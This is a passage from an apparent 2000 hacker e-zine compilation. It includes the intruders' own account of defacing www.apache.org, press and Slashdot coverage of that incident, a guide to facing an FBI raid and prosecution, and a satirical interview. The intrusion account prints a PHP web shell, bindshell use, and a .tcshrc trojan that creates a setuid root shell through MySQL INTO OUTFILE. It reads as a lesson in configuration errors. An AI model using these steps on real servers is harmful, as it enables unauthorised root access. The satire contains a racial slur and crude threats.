      belong to the Backup Operators group. Carefully evaluate if you trust these users. Backup 
      operators have the ability to access all areas of the system to back up and restore files.
       
      Members of the Backup Operators group should have special logon accounts (not regular user a
      ccounts) on which you can set logon restrictions. If Joe is the backup operator, he should 
      have a regular logon account for his personal activities and a special logon account for 
      backing up the system. Set restrictions on the backup account, then set restrictions that 
      force Joe to log on from a specific system only during appropriate hours. Change, with 
      frequency, the name and password of the account to guard against hijacking. 
      
       - Review the backup policies. Is the backup schedule appropriate? Are files safely 
         transported to secure backup locations? How might backup compromise the confidentiality 
         of files? 
      
       - View the Event Log to audit backup activities.

31.0 [IND] The apache.org hack. by {} and Hardbeat (Apr 4th 2000)
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
               How we defaced www.apache.org
                    by {} and Hardbeat

      /*
       * Before you start reading
       */
      This paper does _not_ uncover any new vulnerabilities. It points out common
      (and slightly less common) configuration errors, which even the people at
      apache.org made. This is a general warning. Learn from it. Fix your systems,
      so we won't have to :)
      
      /*
       * introduction
       */
      This paper describes how, over the course of a week, we succeeded in
      getting root access to the machine running www.apache.org, and changed
      the main page to show a 'Powered by Microsoft BackOffice' logo instead
      of the default 'Powered by Apache' logo (the feather). No other changes
      were made, except to prevent other (possibly malicious) people getting in.
      
      Note that the problems described in this paper are not apache-related,
      these were all config errors (one of 'm straight from BugZilla's README,
      but the README had enough warnings so I don't blame the BugZilla developers).
      People running apache httpd do not need to start worrying because of
      anything uncovered herein.
      
      We hacked www.apache.org because there are a lot of servers running apache
      software and if www.apache.org got compromised, somebody could backdoor
      the apache server source and end up having lots of owned boxes.
      
      We just couldn't allow this to happen, we secured the main ftproot==wwwroot
      thing. While having owned root we just couldnt stand the urge to put that
      small logo on it.
      
      /*
       * ftproot == wwwroot
       * o+w dirs
       */
      While searching for the laters apache httpserver to diff it the with
      previous version and read that diff file for any options of new buffer
      overflows, we got ourselves to ftp://ftp.apache.org. We found a mapping of
      the http://www.apache.org on that ftp including world writable directories.
      
      So we wrote a little wuh.php3 including 
      <?
              passthru($cmd);
      ?>
      
      and uploaded that to one of the world writable directories.
      
      
      /*
       * Our commands executed
       */
      Unsurprisingly, 'id' got executed when called like
      
            http://www.apache.org/thatdir/wuh.php3?cmd=id
      
      Next was to upload some bindshell and compile it like calling
      http://www.apache.org/thatdir/wuh.php3?cmd=gcc+-o+httpd+httpd.c and then
      executing it like calling http://www.apache.org/thatdir/wuh.php3?cmd=./httpd
      
      
      /*
       * The shell
       */
      Ofcourse we used a bindshell that first requires ppl to authenticate with
      a hardcoded password (:
      
      Now we telnet to port 65533 where we binded that shell and we have local
      nobody access, because cgi is running as user nobody. 
      
      
      /*
       * The apache.org box
       */
      What did we find on apache.org box:
              -o=rx /root
              -o=rx homedirs
              
      apache.org is a freebsd 3.4 box. We didn't wanted to use any buffer
      overflow or some lame exploit, goal was to reach root with only
      configuration faults. 
      
      
      /*
       * Mysql
       */
      After a long search we found out that mysql was
      running as user root and was reachable locally. Because apache.org was
      running bugzilla which requires a mysql account and has it
      username/password plaintext in the bugzilla source it was easy to
      get a username/passwd for the mysql database.
      
      We downloaded nportredird and have it set up to accept connections on
      port 23306 from our ips and redir them to localhost port 3306 so we could
      use our own mysql clients.
      
      
      /*
       * Full mysql access
       * use it to create files
       */
      Having gained access to port 3306 coming from localhost, using the login
      'bugs' (which had full access [as in "all Y's"]), our privs where
      elevated substantially. This was mostly due to sloppy reading of the BugZilla
      README which _does_ show a quick way to set things up (with all Y's) but
      also has lots of security warnings, including "don't run mysqld as root".
      
      Using 'SELECT ... INTO OUTFILE;' we were now able to create files
      anywhere, as root. These files were mode 666, and we could not overwrite
      anything. Still, this seemed useful.
      
      But what do you do with this ability? No use writing .rhosts files - no
      sane rshd will accept a world-writable .rhosts file. Besides, rshd
      wasn't running on this box.
      
      
      /*
       * our /root/.tcshrc
       */
      Therefore, we decided to perform a trojan-like trick. We used database
      'test' and created a one-column table with a 80char textfield. A couple
      of inserts and one select later, we had ourselves a /root/.tcshrc with
      contents similar to:
            #!/bin/sh
            cp /bin/sh /tmp/.rootsh
            chmod 4755 /tmp/.rootsh
            rm -f /root/.tcshrc
      
            
      /*
       * ROOT!!
       */
      Quite trivial. Now the wait was for somebody to su -. Luckily, with 9
      people legally having root, this didn't take long. The rest is trivial
      too - being root the deface was quickly done, but not until after a
      short report listing the vulnerabilities and quick fixes was build.
      Shortly after the deface, we sent this report to one of the admins.
      
      
      /*
       * Fix that ftproot==wwwroot
       */
      Another thing we did before the deface, was creating a file 'ftproot' in
      the wwwroot (which was also ftproot), moving 'dist' to 'ftproot/dist'
      and changing the ftproot to this new 'ftproot' dir, yielding the
      world-writable dirs unexploitable but allowing ftp URLs to continue
      working.
      
      
      /*
       * What could have been compromised?
       */
      Remember the trojaned tcp_wrappers on ftp.win.tue.nl last year? If we
      wanted to, we could have done the same thing to Apache. Edit the source
      and have people download trojaned versions. Scary, eh?
      
      
      /*
       * In short:
       */
      - ftproot==webroot, worldwritable dirs allowing us to upload and execute
        php3 scripts
      - mysqld running as root, with a FULL RIGHTS login without a password.
      
      
      /*
       * Compliments for the Apache admin team
       */
      We would like to compliment the Apache admin team on their swift
      response when they found out about the deface, and also on their

      Apache Site Defaced by Michelle Finley 

      4:00 p.m. May. 5, 2000 PDT 

      While the rest of the world battled the "Love Bug" worm, free Web-server 
      software-provider Apache had problems of its own. 

      Due to system-level misconfigurations of ftpd and bugzilla, a hacker was 
      able to obtain a shell account and replace Apache's logo of a feather and 
      its "Powered by Apache" tagline with a Microsoft logo and credit. 

      
      "Yes, the www.apache.org site was penetrated," said Ken Coar, a director 
      and vice president of the Apache Software Foundation. "The penetration was 
      through some network services that were configured with an insufficient 
      degree of paranoia. The penetration was not through the Apache Web server 
      software nor any of the other Apache software, but through standard 
      network utilities found on virtually all Internet servers." 

      The people who penetrated the Apache.org system likely were "grey hats," 
      Coar said. The hacker spectrum runs from "black hats," who would break in, 
      do damage, and attempt to avoid tracing, to "white hats," who would note 
      the       configuration problems and let the site managers know about them 
      without taking advantage of them. 

      "These people fall into the 'grey area' in between because they told us 
      about the problems, but not until after they had utilized them to make 
      some apparently innocuous changes," he said. 

      Cruciphux, publisher of the security and hacking electronic zine 
      HWA.hax0r.news, ezine said the site was defaced around 6:37 p.m. EDT on 
      May 3 by hackers known as "{}" and "Hardbeat." 

      "{} belongs to Buffer Overflow Security, a fledgling security group 
      consisting of ex-hackers and including people such as "mixter," who wrote 
      TFN, the DDOS-distributed attack tool recently brought to light in the 
      media by       denial-of-service attacks on major websites," the ezine 
      wrote. 

      A mirror of the defaced site can be found on the Attrition.org mirror site 
      and specific details of the break-in can be found on Apache's site. 

      "They came right out and admitted what had happened and said they were at 
      fault," said OpMan, a New York-based computer systems enthusiast, who 
      noted that "you won't see Microsoft taking the blame for the ILOVEYOU 
      debacle."

      "This was a classy hack," Cruciphux said. "It ended almost like a fairy 
      tale. Although tracks were covered and logs cleared, it was decided to 
      alert the apache.org people about the condition and a meeting between the 
      intruders and       Apache ensued. Not all defacings go this way, so 
      kiddies remember: It is still very illegal and risky to do this. Be 
      warned."

     Apache.org owned by white hats
   
     Friendly strangers briefly took over the Apache Software Foundation server by
     exploiting a series of common configuration errors, and then announced their
     presence by inserting an advertisement for Microsoft at the bottom of the home page.
     The open-source Apache is the most popular HTTP page server software currently in
     use. 
   
     The intruders gained root access to Apache.org and could have done considerable
     damage, including replacing the Apache software offered for download with versions
     containing a Trojan which would have given them access to servers running all
     subsequent copies downloaded from the Apache.org Web site. 
   
     In spite of the damage they could have done, they confined themselves to verifying
     their exploits, fixing one hole in Apache.org's server configuration, and leaving behind
     a harmless reminder. They also posted the full details of their exploits. 
   
     The intruders originally gained easy access via FTP, discovered a plethora of
     world-writable directories (tsk, tsk), and installed a simple BIND shell which they could
     execute remotely via Telnet and from which they learned what services were running
     and the contents of most directories. 
   
     Apache.org was running the BugZilla bug-tracking software, which requires a Mysql
     account. They found Mysql available locally and running as user root, though the
     BugZilla documentation warns against running Mysql as root. 
   
     "We hacked www.apache.org because there are a lot of servers running apache
     software and if www.apache.org got compromised, somebody could backdoor the
     apache server source [code] and end up having lots of owned boxes," the intruders
     said. 
   
     "We just couldn't allow this to happen, we secured the main ftproot==wwwroot thing.
     While having owned root we just couldn't stand the urge to put that small logo on it." 
   
     The intruders, who go by the aliases {} and Hardbeat, showed a bit of purist pride.
     "We didn't wanted [sic] to use any buffer overflow or some lame exploit; [our] goal was
     to reach root with only configuration faults," they explained. 
   
     Apache.org took the exploit in the spirit in which it was meant. "They seemed friendly.
     It would have been nice if they hadn't put the damned Microsoft logo up, but I guess
     they had to do something to get attention," Apache Software Foundation director
     Rasmus Lerdorf said in an interview with CNET. 
   
     "We can only blame ourselves. It's quite embarrassing, but it's a good little heads-up,"
     Lerdorf reportedly said. 

     This has to qualify him as the kewlest corporate suit in the known universe. ®

     Apache site defaced in "embarrassing" hacker attack 
     By Stephen Shankland
     Staff Writer, CNET News.com
     May 5, 2000, 12:45 p.m. PT 

     Intruders defaced the main Web site of the Apache Web server project this 
     week with a fake ad for a rival software package from Microsoft. 

     A group of intruders broke into the server by exploiting a series of 
     weaknesses, said Rasmus Lerdorf, a member of the Apache Software Foundation 
     board of directors and a programmer at Linuxcare. The intruders limited 
     themselves to inserting the Microsoft advertisement at the bottom of the 
     page, though they could have done much worse damage because they had gained 
     complete control over the computer, he said. 

     Because of the comparatively mild damage and the fact that the intruders 
     told Apache how their attack worked, Apache termed them "white 
     hats"--helpful hackers, not the more malicious "black hat" category. 

     "They seemed friendly," Lerdorf said. "It would have been nice if they 
     hadn't put the damned Microsoft logo up, but I guess they had to do 
     something to get attention." 

     The burgeoning number of computers on the Internet is vastly increasing the 
     opportunity for attackers looking for sites to break into. At the same 
     time, those computers also are storing more important information, such as 
     credit card numbers or corporate records. 

     Apache is software used on a server to deliver Web pages to Internet 
     browsers. It's the most commonly used Web server software, running on 60 
     percent of Web servers, according to a study by Netcraft. Microsoft's 
     Internet Information Server is in second place with 21 percent. 

     Apache, along with Linux, is among the best-known "open-source" programming 
     projects, in which anyone may see, modify and redistribute the software's 
     original programming instructions. Open-source projects typically are 
     developed by a core group of volunteers, but corporations are increasingly 
     involved as well. IBM and Sun Microsystems in particular have boosted 
     Apache. 

     The basic problem at Apache was that too many people could install whatever 
     software they wanted on the server, leading to vulnerabilities that stemmed 
     from the different pieces of software interacting, Lerdorf said. "We just 
     had too many people installing too many services on the box without 
     coordinating with each other," Lerdorf said. 

     Apache now has shut down two vulnerabilities that led to the attack and has 
     reduced the number of people who have control privileges, he said. In the 
     longer term, Apache will be splitting jobs across several servers, a 
     configuration that allows better security, Lerdorf said. 

     In a note posted to the Bugtraq security mailing list today, the intruders 
     described how they broke into the server. 

     Lerdorf said the first stage was that members of the public could store 
     software on the server after sending it with FTP software. The attackers 
     used this feature to save a small program on the machine that later could 
     be used to tell them what files were stored elsewhere on the system. 

     The intruders then discovered the server had the Bugzilla bug-tracking 
     software produced by Mozilla, the organization building America Online's 
     Netscape Web browser. A weakness in Bugzilla allowed the attackers to gain 
     complete control over the system, Lerdorf said. 

     Apache shut down Bugzilla completely and will either fix it or replace it 
     with other software, he said. 

     Lerdorf put a good face on the defacement. "We can only blame ourselves," 
     Lerdorf said. "It's quite embarrassing, but it's a good little heads-up." 
     
     SlashDot;
     
      Posted by jimjag on Thursday May 04, @11:23AM
      from the strong-as-the-weakest-link dept.
      Yesterday, due to system-level misconfigurations, www.apache.org was 
      defaced after a root-level breakin. Those responsible for finding the 
      holes and the ASF have been in cordial contact, and the holes have been 
      plugged. In the process of doing that, FTP and other services on 
      www.apache.org have been stopped. A mirror of the defaced site can be 
      found on the Attrition.org mirror site. Brian Behlendorf sent the 
      following to various Apache mailing lists: 

      Hi. We have been made aware (thanks to a very humorous banner ad for 
      Microsoft Back Office on the front of www.apache.org!) that our particular 
      configuration on www.apache.org of ftpd and bugzilla opened a security 
      hole that allowed someone from the outside to get a shell account, and 
      then get root. We have been in contact with those who found the hole, and 
      have closed up the misconfigurations that allowed this. 

      It is important to note that this is *not* a hole in the Apache web server 
      or related software products. I would encourage double-checking the PGP 
      signatures of Apache releases for the immediate future. 

      However, I do not believe we are out of the woods yet. Bugzilla has not 
      been thoroughly audited, and while I am not worried about ftpd, simply 
      having another deamon that can write files to the web server whose purpose 
      has been completely superceded by others suggests that taking it down for 
      good is the right idea. 

      So I am taking down FTP - something that should have been done long ago. 
      If there are FTP links on any of our pages (or on places like freshmeat) 
      they should be change to HTTP. There are enough high-quality text-mode 
      HTTP clients that there is no point to having it up, save for mirroring, 
      and we allow rsync and cvsup for that. I will be contacting the mirror 
      site admins list to communicate this. 

      Also, I have taken down all installations of bugzilla on apache.org until 
      it can be audited. I will be performing a first pass tonight over it, but 
      anyone else familiar with perl and willing to deal with rather ugly code 
      is welcome to do so as well. I will set it back up once I'm comfortable 
      there's been at least one reasonable pass over the whole codebase and any 
      obvious holes have been plugged. This is only life-support though; I 
      really don't think we should be using bugzilla once a suitable replacement 
      is found. 

      Finally, I think it can be said that this compromise was mostly due to a 
      lack of discipline on the part of those who had root and set up services 
      without considering the ramifications of the way they were installed. I 
      don't want to point fingers, since I'm probably at least as to blame as 
      others, but I do feel that the policy of giving root access to a larger 
      number of people than usual was probably a mistake. Along those lines, 
      I've changed the root password and removed everyone from group wheel but 
      myself - sorry to be fascist about this but I kinda feel like at the end 
      of the day it's my responsibility. We'll come up with a strategy soon 
      about granting sudo access to particular people for particular binaries so 
      that I don't become a bottleneck again. 

      The details will soon be posted to bugtraq. Thanks.

      Pow-Wow With Apache's Hackers

        By Michelle Head 

        Can you be scalped nicely? Apache seems to think being red in the face 
        beats being red in the accounting department after an embarrassing 
        encounter with some clever and well-meaning hackers. 

        With the IT world still bobbing confusedly in the wake of the Microsoft 
        Outlook love bug, the Open Source Internet Servicer, which currently 
        runs over 60% of the Web sites on the Internet, was targeted by hackers 
        Friday. The intruders, who declined to damage or disrupt the site, 
        instead marked their trail with a modified Microsoft logo. 

        Shortly afterwards, the hackers described their harmless heads-up in 
        full detail on the Internet in a step-by-step tutorial, identifying 
        themselves as Hardbeat and {}. The site describes how configuration 
        errors allowed the two access to Apache--and how, instead of damaging 
        the site, they simply posted an amusing warning and secured the site 
        from other, less well-meaning prowlers on their way out. 

        Asked if this hack was meant to protect a major Open Source project, 
        Hardbeat responded, "We did this hack because we could. The possible 
        risks mentioned in the paper (Trojanning Apache source) were really an 
        afterthought. We did this because Apache.org is a high-profile site, and 
        these configuration problems are common. Therefore, defacing Apache.org 
        would be a great way to draw attention to these errors." 

        {} described his background. "I am a coder, everything I write (like a 
        Linux kernel security patch named auditfile) is Open Source," {} 
        volunteered. "I work at a local monkey zoo and at a Cable ISP." {} 
        intends to start formal training in computers next year. 

        Hardbeat's background in Open Source is less extensive. "I have written 
        one Open Source tool (http://www.dataloss.net/midentd). It's [available 
        under the GNU (GNU's Not UNIX) General Public License (GPL)] but the 
        next version will not be. It is also no longer maintained, because I am 
        too busy. In daily life, I go to University (I am in my first year of 
        Computer Science) and I have a job as a systems administrator/developer 
        at a big hosting company in The Netherlands. I have no professional 
        training," Hardbeat explained. "It's all experience." 

        Hardbeat commented on the hackers' choice of a Microsoft logo for their 
        marker. "Let's start by stating that that had no political meaning--we 
        were looking for a subtle way to show we had that kind of access, 
        without damaging anything or hindering people in their business at 
        www.apache.org," he wrote. 

        "We also figured that would draw a teensy little bit of extra 
        attention," he continued, "and you asking this question shows that it 
        does. :) Also note that this was not an official M$ logo," he added. "A 
        friend of ours who works as a graphic designer did this thing for us." 

        On whether Apache is their first (or last) mission, the happy hackers 
        have no comment. "If we have anything to share we will, but privacy is a 
        high good," Hardbeat explained. 

        Hardbeat and {} hoped Apache would have "the only correct reaction to 
        such a hack--to talk to the people who did it, and not sue them when 
        they had no bad intentions." The pair hoped to educate Apache rather 
        than upset them. 

        "Talk to them, ask them what they did and especially how they did it," 
        Hardbeat advised. "That way they will stay friendly to you and help you 
        fix the problems in a quick and reliable way." 

        "Apache reacted above these hopes, being friendly and responsive, 
        complimenting us `you guys are clever!', `Good work, guys'" Hardbeat 
        reported. 

        Apparently Apache's director was grateful for the warning. "They seemed 
        friendly. It would have been nice if they hadn't put the damned 
        Microsoft logo up, but I guess they had to do something to get 
        attention," Apache Software Foundation director Rasmus Lerdorf said in 
        an interview with CNET. "We can only blame ourselves.

      A. INTRODUCTION
      
      Now days, after very popular movies such as "Hackers" and "The Matrix" the hacker world has
      much been glamorized as something most people will see as something very
      interesting.  However, what is not shown is the real consequences of what could happen in
      the end.  There have been so-called hacker groups popping up all over, many of which last
      about as long as a 10 dollar bill laying on the road.  In the past 5 years I have gone
      through many things in the scene.  I have seen people trusted by the community turn into
      FBI informants, I have seen looked up to people in the scene turn into FBI informants, I
      have also seen best friends turn their backs.  This is all part of the so-called hacker
      world.  Many individuals these days will do anything they can to gain respect in the scene,
      however many are unaware what may come of this.  I have been through one of the most highly
      publicized hacker incidents in the last decade, and unfortunately have also gone through
      the court battles.  The battles I hope this document will help most get through.  However,
      this document will be focused primarily on the legal issues involved and what to and to not
      do.  I write this with much respect for Agent Steal's 1997 file "Everything a hacker needs
      to know about getting busted". I am going to go over some things that have not been covered
      in his file.  It is an excellent file, read it, read it many times.  You may obtain his
      text file at http://www.attrition.org/~modify/texts/scene/everything.busted.html .  Enjoy.
      
      
      B. THE RAID
      
       This is probably when it will hit home for most of you.  You may suddenly realize what you
      have done is not so harmless.  You will most likely be awakened from a sleep between
      6am-9am.  You will get to hear the infamous FBI knock.  They knock louder than anyone you
      have ever heard, you will know its them.  If you do not open the door within a minute or so
      they will not hesitate to open the door themselves.  If you are in an apartment complex,
      they will have a key.  If you are at your home, they will have a bigger key that will knock
      your door down.  It will usually be a few FBI agents and then local law enforcement
      'assisting'.    They don't care if you're a 9 year old or a 40 year old.  They do it all
      the same.  When they come in they will find you and grab you and drag you somewhere safe
      where they can search you.  In most cases that will be outside your apartment or
      house.  They will have their guns drawn, so doing something stupid at this point would not
      be bright at all.  They will then handcuff you and bring you back inside and set you down
      on a couch or a nice chair.  Get comfortable you may be sitting there awhile.  An agent
      will then proceed to tell you they are going to search you place, make sure you ask for the
      search warrant. A key to look for here is who the warrant is written out to.  In most cases
      your local police will NOT have a warrant issued to them, do not let them go through
      your stuff.  Leave it to the FBI.  There is actually a good reason for this, the FBI will
      not and cannot issue citations for drugs, underage drinking, etc.  If the police see it
      they will write you up.  You don't need that. They like to get sneaky and try to get you to
      agree and make you think they have one.  They will NOT always have one.  After you overlook
      the warrant, they will then proceed to tear your place apart.  They will search everything,
      I mean everything.  In fire alarms, behind posters, in attic, under rugs, in refrigerator,
      in tape decks, in your garbage.  While the agents are executing the search one designated
      agent will be there to try and get you to talk to them. You have heard it before and you
      will hear it again many times: DO NOT SPEAK WITH ANY OF THEM, KEEP YOUR MOUTH SHUT! NOTHING
      YOU SAY WILL DO YOU ANY GOOD.  When you decide not to speak with them chances are they will
      get a little testy.  That's their problem.  I suggest you do not say a single world while
      they are there other than "May I see the warrant?"  You don't have to; it's your right to
      remain silent.  In most cases they will not arrest you.  They will leave.  They will also
      try and say bye to you and get you to call them back.  This is a controversial situation,
      some people say call them back and try to cooperate.  However, in my experiences it gets
      you nowhere.  So don't bother.  Before they leave, make sure you get a copy of the search
      warrant and the "Search & Seizure" form.  That form will allow you to get your things
      back.  If it is not written down on there, you will not receive them back.  Check it over
      before they leave.
      
      C. CHARGES
      
      In most cases after the raid you will not hear from the FBI for quite some time.  Some
      cases, never again.  They tend to take their time.  Charges will follow.  They will be back
      to execute yet another search warrant, however most cases this will have to be a voluntary
      execution.  They will most likely be back with a list of charges being brought
      forward.  They will then ask you if they can execute a search warrant.  If you say no they
      will say a cocky line such as "Oh, that doesn't matter we can get one within 1 hour, and we
      will let the judge know you're not cooperating."  This is the point where you may want to
      cooperate somewhat.  They can keep you in custody.  They will arrest you and bring you in
      front of the nearest Magistrate (which is a fancy term of a off dutiy judge).  He will then
      decide whether you should be kept in custody or not.  In my case, I was brought downtown to
      the courthouse and put in a real nice office and put on a teleconference with a Magistrate
      and he discussed with the FBI agents if I should be kept in custody or not, and if not what
      my conditions of release should be.  This is where the agents may say you are not
      cooperating.  I was release on a signature bond and restricted from coming within 10 feet
      of a computer. 
      
      D. GETTING A DEFENSE
      
      Depending on your case, you are going to have to decide what kind of lawyer to get.  In
      federal cases there really is no such thing as "Public Defender".  What they do is put
      together a bunch of lawyers who would like to work federal cases to extend their
      resumes.  They then pick from a "hat" to come up with a lawyer to represent you.  In my
      case, I was hooked up with a very very nice lawyer.  So therefore I did not have to go out
      and spend my life savings on legal fees.  However, you could get the so-called shaft and
      get a sucky PD wannabe.  In this case you are going to want to go searching for a lawyer
      who has experience in this sort of law.  Those kinds are becoming easier and easier to find
      these days.  Depending on your wallet you are going to want to find one you can afford and
      yet still be able to eat afterwards.  
      
      E. INDICTMENT
      
      
      This is sort of a downtime.  You must wait for the Grand Jury to come back with an
      indictment on your charges.  This will happen 99% of the time.  This is when the charges
      are official.  Most indictments will have extra charges tacked on that the government
      themselves know they cannot prove.  These will be used for "Plea Bargain" situations.  Such
      as "You plea to count 1 and 3, we will drop 2 and 4" You get the idea.  
      
      F. EVIDENCE
      
      Be prepared, you are going to be surprised at what the government has on you, and your
      'conspirators.' You are going to want to file a "Motion for Discovery" which will require
      the government to hand over all their "discovery" materials.  This will include photocopies
      of paperwork obtained at their raids, stuff from others.  Statements made by others against
      you.  And of course hardware.  You get the point.  The government will go over this very
      closely and pick apart everything.  They like to link everything together, even if its not
      called for.  They will do it.  They will most likely go through your drives and link
      together things to make you look like a monster.  They will also pin you down as part of a
      conspiracy if you are involved with more than one person, such as in my case.  If you are
      lucky they won't file addition conspiracy charges.  
      
      
      G. HEADING TO COURT
      
      
      Once the indictment is presented, and then you have to make some very important
      decisions.  These could affect your future.  First off, are you clearly guilty of the items
      and can they be proven? If so, common sense tells you not to spend your life fortune to
      hire a lawyer who will lie for you.  In most computer cases there is substantial evidence
      that is rather blatant.  Such as phone logs that will shoe exactly what you did.  If you
      believe you are being targeted for things that cannot be proven.  Go ahead fight it.  In
      most cases the government will try to tack on a few extra charges, which are rather
      irrelevant and they know cannot be proven.  However, these are used for plea bargain
      situations.  I will discuss that a bit more in the next section.  So far, in this file I
      have taken a much better look at Federal crimes. Since unfortunately that is all I have
      personal experience in.  In federal cases all court dates will be one of the Federal
      Courthouses.  You most likely will have to drive a ways to get to it.  Each state has at
      least two federal courthouses.  This will vary depending on where you are. 
      
      F. PLEA AGREEMENTS
      
      They will be offered.  Sometimes they will be bad, sometimes they will be good.  Do NOT
      take the first one presented to you.  This is usually an agreement, which lets the
      government know how guilty you really think you are.  They will offer more than one.  If
      you have a good lawyer he will be in contact with the US Attorney and will try to work
      something more practical out.  It happens in most cases.  This is a very important thing to
      think about.  If do not accept a plea agreement, then you can risk your case in
      court.  However if you loose, you may be wishing you had accepted an agreement.  You can't
      go back and accept it later.  Think about this, think about this long and hard.  If you
      decide to accept one, make sure you read the WHOLE agreement over, several times.  They
      like to hide things in there.  Be careful of what you sign.
      
      G. SENTENCING
      
      
      Let's skip ahead here.  Lets say you are found guilty of something.  Then the next phase is
      sentencing.  This can be a wreck to most people and their families.  Sentencings in federal
      cases go by the United States Sentencing Guidelines aka U.S.S.G. It is a point scale.  They
      will take your criminal history, your cooperation, the damage caused, i.e. and add points
      up and minus points off.  They will come up with a number.  This number will decide the
      sentencing range.  In my case there was quite a problem with this.  My lawyers added up a
      number of 8.  The government had a number of 9.  Because of the disagreement on damage
      caused.  The 1-point difference was about 5 months different in imprisonment.  The judge
      has the discression to not use the point system.  However, my case was sort of a precedent
      being set.  If the point were 8, I would have gotten 0-6 months.  However, the minimum
      sentence in the code for the sub Section 1030 crime was 6 months.  So that caused a
      problem.  Could the judge go less than 6? He clearly could according to the U.S.S.G. but
      not according to the law.  He elected to rule out the points, and go with the book.  I was
      given 6 months.  The very minimum.  Even though the government was looking for 28 months
      :)  The judge may also decide where to put you.  In my case I was sentenced to a Federal
      Half-Way house.  I was lucky, there was room and I did not have to spend anytime in a
      Federal Prison.  I have not been to the halfway house yet however, so I will leave
      information on that to be put in a revision down the road.  
      
      H. YOUR FUTURE
      
      
      Now, after your sting in the Federal holding center.  You will most likely be not allowed
      to speak with any of your ex-friends.  Not use a computer.  Let all employers know of your
      past.  Be on probation.  Not be allowed to profit from your story.  All these things come
      as part of your sentence.  You will have to report to a probation office, be drug
      tested.  Have to contact her of any police contacts, if you are leaving your district.  It
      will not be fun.  I got the maximum probation, which is 3 years for my case.  I will deal
      with it.  If I can I'm sure you can :)
      
      I. THE END
      
      
      Well, I hope this was a help to you.  This along with Agent Steals text I am sure you can
      get a very good understanding of the whole situation.  I am not here to tell what to and
      not to do.  Remember, I have gone through it.  I know how it is.  If you are going to do
      these activities please remember these things.  As long as you talk to the right people
      (Stay away from John Vransevich @ AntiOnline, Carolyn Meinel @ HappyHacker) and be very
      careful when you do things.  Slipping up once, may make these text files reality.  
      
      I admire and respect the following people and organizations very much for their friendship
      and help over the past 5 years, you have been a big part of my life whether you know it or

       ((Hackers unite))-((A goat security expose))
      
      
      In a most terrifying move by the biggest names in the underground community, 
      representatives of Global Hell (gH), the Shot Down Crew (sDc) and 
      the Brotherhood of Warez (BoW) have announced a merger making them the biggest and 
      more powerful hacker group the Eris Free net's IRC network has ever seen.  
      g0at security [http://www.goat-advisory.org] has taken upon itself the mission of 
      getting to the bottom of this alarming event and discovering the reasoning behind it.
      
      Recently, a member of g0at security visited Global Hell leader, Patrick Gregory 
      (aka Mosthated) in his new home, a United States federal penitentiary where he is
      serving 5 years. Upon entering the prison library, where we were to interview Gregory,
      we found him sitting on the lap of another inmate tapping away at the keyboard of the
      prison computer. When asked what he was working on, Gregory replied saying that he had
      recently reformatted the computer and installed the latest version of Linux Mandrake as
      opposed to Microsoft Windows 95 since microsoft products are lame. He then went on to
      tell us that to occupy time in prison, he has downloaded Microsoft Visual Basic 6 and
      has been running it with the latest version of Wine in the KDE environment. A full interview
      follows.
      
      GS - g0at security
      MH - Patrick Gregory
      
      GS: Can you confirm a merger between Global Hell and other well known underground groups?
      MH: Yes, Global Hell is merging with two other group.
      
      GS: What groups are these?
      MH: The Shot Down Crew and the Brotherhood of Warez.
      
      GS: What is the reasoning behind this merger?
      MH: Well as you may know, since the FBI investigation commenced in the Summer of 1999,
          gH has slowly been dying out. Many of our members have taken off in fear of being
          raided, some were arrested, and gH's two leaders are now serving time. We have lost 
          our stronghold on the internet and we must regain this in order to show the public
          stability in our organization.
      
      GS: Why is stability in Global Hell required for the general public to see?
      MH: The gH ran security site (http://www.pure-security.net) has been growing
          gradually over the past half year and we need to raise some capital in 
          order to increase our expansion. Pure Security Networks, is announcing that
          it has filed to go public (IPO) in May of 2000.
      
      GS: An IPO? Please expand on this...
      MH: Well, May 23 2000, Pure Security Networks under the symbol of PSN, will be trading
          on the Nikkei 225. Common shares will start a $0.32, no preffered shares are  
          being offered.
      
      GS: During this expansion of Pure Security Networks, what new services will be offered?
      MH: Well we have negotiated a contract with the government of Zaire to offer internet
          connectivity to local schools. Also we plan on beginning mutual fund and retirement
          consultations along with helping script kiddies create investment portfolios.
      
      g0at security then went on to get the Smack Down Crew's side of the story. g0at security
      found members of the group on the James Joyce appreciation BBS located in Dublin, Ireland.
      When asked about the merger and various questions related to the IPO, sDc representatives
      respond with the same uniform answer, "Whachoo talkin bout foo". They then went on ranting
      about how they own goats. They ended the interview with a very befuddled quote. "Dem goats
      better rememba somethin foo, mess with the best, die like the rest". We were then expelled
      and banished for life from using the James Joyce appreciation BBS.
      
      Finally, g0at security went on to get the story from the Brotherhood of Warez. g0at security
      
      met with a member of the group, sw_r on a popular IRC channel, #solace on efnet which 
      appeared to have been taken over by some goats. When asked about the reasoning behind 
      the merger and IPO, he went on to quote us this:
      
      "Back in the day, I was a member of the MOST elite hacker group ever, the Masters of Deception.
      MOD was so much more elite then LOD. FUCK the LOD, they should all rot in hell. God I hate
      Eric Bloodaxe, that neegro is going to get it. Friggin hick, show them texas boys what I'm made
      of. Anyways, a book was written about the MOD and how we kicked the LOD's asses! Those stupid 
      authors (Michele Slatalla and Joshua Quittner) didn't include me in their friggin book! They
      should DIE! I own them. I own them all. So with this IPO, I hope to buy out the Harperperennial 
      Library and ruin those damned authors carriers. I'll show them who the elite one is. Not
      that twirp PhiberOptik, I own his ass. I'll school him in DNS anyday".
      
      g0at representatives then proceeded to back away very slowly until there was enough distance
      for us to run away, fast, very fast.
      
      Call your brokers folks, this hot new IPO is expected to rise, fast, very fast. In final notes,
      this new group being dubed, the Planet Hackers Club should not be messed with. Already they have
      waged war with other groups such as DevilSoul and the Pakistan Hackers club. Routers everywhere
      are in major trouble. We hoped this expose was helpful and informative and all further questions
      should be direct to members of this new merged group.

      UPDATED May 10, 2000 9:58 AM PT 

      Online music vendor Napster Inc. said it has removed 317,377 users who have 
      been accused of violating copyrights off its Web site.

      The action was taken in response to a request from heavy metal band 
      Metallica, which filed suit against Napster in April. Last week Metallica 
      presented Napster with a list of users who it claimed had violated the 
      band's copyrights. 

      The band provided Napster with a list of user names; file names of 
      allegedly infringed music for each user; and the time, date and IP address 
      of the Napster server to which the user was connected. The list did not 
      contain IP addresses of the users.

      Rapper Dr. Dre announced Wednesday he will submit names to Napster for 
      removal from the system, according to attorney Howard King, who also 
      represents Metallica.

      Napster's technology allows users to copy digital music files from one 
      another.

      "We intend to fully comply with the DMCA (Digital Millennium Copyright 
      Act) and our policies," reads a statement posted on the Napster site. "We 
